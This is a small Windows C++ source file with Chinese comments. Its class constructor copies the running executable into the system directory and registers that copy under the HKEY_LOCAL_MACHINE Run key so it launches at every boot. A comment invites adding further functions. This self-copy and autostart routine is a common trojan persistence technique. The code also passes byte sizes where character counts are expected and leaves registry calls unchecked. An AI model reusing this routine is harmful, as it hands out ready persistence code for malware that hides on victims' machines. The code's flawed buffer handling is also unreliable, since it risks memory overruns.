#include "stdafx.h"
#include "RegisterHEKY.h"


RegisterHEKY::RegisterHEKY()
{
	wchar_t system[MAX_PATH];			//系统目录路径
	wchar_t pathtofile[MAX_PATH];		//要开机运行的文件的完整路径
	HMODULE GetModH = GetModuleHandle(NULL);		//得到当前执行文件的全路径
	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
	//得到系统文件所在目录的路径
	GetSystemDirectory(system, sizeof(system));
	//形成要复制到的全路径
	wcscat(system, TARGETFILE);
	//自我复制到目标路径
	CopyFile(pathtofile, system, false);
	//写入注册表，以便开机自动运行
	HKEY hKey;
	//打开注册表:路径如下
	//HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	//新增一个值,名称随意命名,值为要开机运行的文件的完整路径
	long ret = RegSetValueEx(hKey, TARGETFKEY, 0, REG_SZ, (const unsigned char*)system, sizeof(system));

	//关闭注册表:
	RegCloseKey(hKey);
	/*可以加入其他功能*/
}


RegisterHEKY::~RegisterHEKY()
{
}
